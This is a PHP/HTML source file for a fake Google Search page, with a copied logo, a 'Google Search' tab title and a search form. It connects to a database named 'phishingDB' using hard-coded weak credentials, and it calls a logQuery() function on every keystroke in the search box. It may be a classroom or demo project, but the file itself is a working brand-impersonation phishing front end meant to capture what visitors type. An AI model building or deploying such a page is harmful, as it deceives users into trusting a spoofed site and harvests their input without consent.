<!-- Connect to the database -->
<?php
$server = "localhost";
$username = "php";
$password = "password";
$database = "phishingDB";

$conn = mysqli_connect($server, $username, $password, $database);
?>

<!DOCTYPE html>
<html>
    <head>
        <!-- Link to external CSS -->
        <link rel="stylesheet" href="style.css">
        
        <!-- Tab name -->
        <title>Google Search</title>
    </head>
    <body>
        <div class="unselectable">
            <h1>
                <span class="blue">G</span>
                <span class="red">o</span>
                <span class="yellow">o</span>
                <span class="blue">g</span>
                <span class="green">l</span>
                <span class="red">e</span>
            </h1>
        </div>
        
        <div class="search-box">
            <form action="/search.php" method="post">
                <input type="text" onkeyup="logQuery()" id="query" name="query">
                <input type="submit" id="submit" value="Search">
                <input type="submit" id="lucky" value="I'm Feeling Lucky">
            </form>
        </div>

        <script src="script.js"></script>
    </body>
</html>